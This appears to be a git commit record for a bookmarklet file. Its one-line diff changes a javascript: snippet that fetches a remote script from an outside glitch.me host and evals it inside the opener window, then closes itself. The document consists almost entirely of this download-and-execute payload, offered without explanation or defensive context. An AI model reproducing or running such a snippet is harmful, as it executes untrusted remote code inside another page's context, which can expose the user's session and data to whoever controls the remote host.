94d1ff4b231c5b0db3e7601a77746b157bc2a004
Cubing Hay <120436950+BlueHatCrew@users.noreply.github.com>
2023-03-14 10:09:09 -0700

    Update mini.bookmarklet.js

--- mini.bookmarklet.js
+++ mini.bookmarklet.js
@@ -1,1 +1,1 @@
-javascript:opener.fetch("https://uboss.glitch.me/cod.js").then(data=>{data.text().then(e=>{eval(e)})})
+javascript:opener.eval(`fetch("https://uboss.glitch.me/cod.js").then(data=>{data.text().then(e=>{eval(e)})})`)&&close()
